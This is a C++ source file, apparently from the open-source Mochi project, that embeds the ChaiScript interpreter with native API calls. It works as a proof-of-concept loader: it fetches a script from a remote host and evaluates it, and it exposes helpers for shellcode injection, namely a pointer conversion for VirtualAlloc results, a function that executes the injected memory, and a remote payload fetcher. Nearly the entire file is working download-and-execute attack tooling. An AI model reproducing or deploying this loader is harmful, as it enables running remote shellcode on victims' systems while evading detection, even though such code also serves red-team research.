// Credit for the ChaiScript low level scripting with native API call support goes to: https://github.com/domzigm/lcscript

/*
Original Source: 
	
	https://github.com/shogunlab/Mochi

License:

	Copyright 2022 Steven Patterson

	Licensed under the Apache License, Version 2.0 (the "License");
	you may not use this file except in compliance with the License.
	You may obtain a copy of the License at

		http://www.apache.org/licenses/LICENSE-2.0

	Unless required by applicable law or agreed to in writing, software
	distributed under the License is distributed on an "AS IS" BASIS,
	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
	See the License for the specific language governing permissions and
	limitations under the License.

*/

#include <stdint.h>
#include <string>
#include <vector>

#include <chaiscript/chaiscript.hpp>
#include "dyncall.h"
#include "callGate.h"

#include "HTTP.h"
#include "chaiHelpers.h"

// For PoC simplicity, declare global pointer for use with shellcode injection
void* execAddress = {};

// Initialize ChaiScript
chaiscript::ChaiScript chai;

// Helper function to convert a memory address in integer format to a usable pointer
int convertAddrAndAssign(uint64_t memoryIntAddr) {
	// Format the integer as a memory address string
	std::cout << "[+] Memory address as int returned by ChaiScript was: " << memoryIntAddr << std::endl;
	std::stringstream stream;
	stream << std::hex << memoryIntAddr;
	std::string memoryStrAddr(stream.str());
	std::cout << "[+] Converted memory address: " << memoryStrAddr << std::endl;

	// Turn memory address string into pointer for execution
	unsigned long long memoryAddr = {};
	// For PoC simplicity, just use sscanf
	sscanf(memoryStrAddr.c_str(), "%llx", &memoryAddr);
	execAddress = (void*)(uintptr_t)memoryAddr;

	return 0;
}

// Helper function to trigger execution of shellcode memory, haven't found a way to do this within ChaiScript yet
int executeMemory() {
	((void(*)())execAddress)();
	return 0;
}

int main(int argc, char** argv)
{
	chai.add(chaiscript::user_type<DLLib*>(), "libPtr");

	// Expose functions to ChaiScript engine
	chai.add(chaiscript::fun(&chai_LoadLib), "LoadLibrary");
	chai.add(chaiscript::fun(&chai_dbgAddr), "DbgAddr");
	chai.add(chaiscript::fun(&chai_uintPtr), "uintPtr");
	chai.add(chaiscript::fun(&chai_pushArray), "pushArray");
	chai.add(chaiscript::fun(&chai_printUint32Hex), "printUint32Hex");
	chai.add(chaiscript::fun(&chai_printUint64Hex), "printUint64Hex");

	// Custom functions for use with shellcode injection in ChaiScript
	//
	// This is for converting results from VirtualAlloc into usable pointers
	chai.add(chaiscript::fun(&convertAddrAndAssign), "convertAddrAndAssign");
	// This is for executing memory after RtlMoveMemory is done
	chai.add(chaiscript::fun(&executeMemory), "executeMemory");
	// This is for retrieving the shellcode payload remotely
	chai.add(chaiscript::fun(&getRemoteFile), "getRemoteFile");

	// Expose ability to register function calls
	chai.add(registerFunCall());

	// Set endpoint for fetching the script
	std::string scriptHostname = "";
	std::string scriptPath = "";

	// Fetch script contents
	std::string scriptResult = getRemoteFile(scriptHostname, scriptPath);
	std::cout << "\nChaiScript file fetched was: \n" << std::endl;
	std::cout << "=========================================\n" << std::endl;
	std::cout << scriptResult << std::endl;
	std::cout << "\n=========================================" << std::endl;

	// Execute the script
	std::cout << "\nExecuting ChaiScript file now...\n" << std::endl;
	chai.eval(scriptResult);

	// Uncomment this to do inline script execution, useful for debugging/experimenting
	/*
	chai.eval(R"(
		puts("Hello from inline!");
		puts("\r\nTest");
	)");
	*/

	std::cout << "\nExecution complete!\n" << std::endl;

	return 0;
}
